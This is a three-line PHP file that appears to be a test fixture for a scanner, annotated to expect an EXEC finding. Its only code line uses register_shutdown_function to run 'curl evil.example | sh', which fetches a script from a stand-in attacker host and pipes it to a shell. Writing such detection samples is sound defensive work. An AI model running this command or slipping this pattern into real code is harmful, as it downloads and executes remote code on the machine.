<?php
// @expect: EXEC
register_shutdown_function('exec', 'curl evil.example | sh');
